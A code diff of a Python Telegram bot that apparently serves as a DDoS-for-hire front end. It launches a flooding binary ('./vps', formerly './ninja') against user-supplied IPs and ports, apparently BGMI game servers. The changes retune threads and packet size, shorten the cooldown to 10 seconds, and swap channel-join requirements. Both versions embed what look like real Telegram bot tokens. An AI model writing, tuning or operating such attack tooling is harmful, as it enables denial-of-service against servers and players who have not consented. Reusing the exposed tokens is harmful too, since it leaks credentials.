@@ -6,17 +6,17 @@ from apscheduler.schedulers.background import BackgroundScheduler
 from functools import partial
 
 # Bot token and channel IDs
-BOT_TOKEN = "7640430283:AAFSrhWgzkWocRQMsT8lQKVsTKMsYP-_-vE"
-CHANNEL_ID = ["-1002162993601", "-1002147999578"]
-OWNER_ID = {123456789, 987654321}  # Replace with your owner IDs
+BOT_TOKEN = "6704057021:AAHPI7LcxVkUTmTZ75ulA41pU0tS0BSxm8k"
+CHANNEL_ID = ["-1002004427126"]
+OWNER_ID = {5759284972, 5142603617}  # Replace with your owner IDs
 
-THREADS_COUNT = 700
-BYTE_SIZE = 7
+THREADS_COUNT = 500
+BYTE_SIZE = 512
 
 # Constants
 INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
 MAX_TIME = 120
-COOLDOWN_TIME = 300
+COOLDOWN_TIME = 10
 # Global variables
 last_attack_time = {}
 bgmi_blocked = False
@@ -72,8 +72,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_user_in_all_channels(user_id, context):
         await update.message.reply_text(
             "❌ Access Denied! Please join the required channels to use this bot.\n"
-            "1. [Channel 1](https://t.me/+9TCse4iLqWQ4MjRl)\n"
-            "2. [Channel 2](https://t.me/+lgb92RXeI2E4ZjM1)",
+            "1. [Channel 1](https://t.me/+yjGbtaSabqY1MGE1)",
             parse_mode="Markdown",
         )
     else:
@@ -91,8 +90,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_user_in_all_channels(user_id, context):
         await update.message.reply_text(
             "❌ Please join all required channels to use this command:\n"
-            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
-            "2. [Channel 2](https://t.me/+y2fUX5ejJw1iNjBl)",
+            "1. [Channel 1](https://t.me/+yjGbtaSabqY1MGE1)",
             parse_mode="Markdown",
         )
         return
@@ -122,11 +120,11 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if user_id not in admins and time_sec > MAX_TIME:
-        await update.message.reply_text("⚠️ Non-admins are limited to 90 seconds.")
+        await update.message.reply_text("⚠️ Non-admins are limited to 120 seconds.")
         return
 
     try:
-        subprocess.Popen(["./ninja", ip, str(port), str(time_sec), str(BYTE_SIZE), str(THREADS_COUNT)])
+        subprocess.Popen(["./vps", ip, str(port), str(time_sec), str(BYTE_SIZE), str(THREADS_COUNT)])
         ongoing_attacks[(user_id, ip, port)] = {
             "username": username,
             "time": time_sec,
